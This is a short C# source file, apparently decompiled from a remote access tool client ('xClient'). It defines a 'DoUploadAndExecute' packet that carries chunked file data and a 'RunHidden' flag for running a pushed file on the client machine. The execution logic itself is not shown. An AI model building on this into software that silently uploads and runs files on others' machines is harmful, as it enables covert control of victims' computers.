using System;

namespace xClient.Core.Packets.ServerPackets;

[Serializable]
public class DoUploadAndExecute : GInterface4
{
	public int ID { get; set; }

	public string FileName { get; set; }

	public byte[] Block { get; set; }

	public int MaxBlocks { get; set; }

	public int CurrentBlock { get; set; }

	public bool RunHidden { get; set; }

	public DoUploadAndExecute()
	{
	}

	public DoUploadAndExecute(int id, string filename, byte[] block, int maxblocks, int currentblock, bool runhidden)
	{
		ID = id;
		FileName = filename;
		Block = block;
		MaxBlocks = maxblocks;
		CurrentBlock = currentblock;
		RunHidden = runhidden;
	}

	public void Execute(GClass33 client)
	{
		client.method_8(this);
	}
}
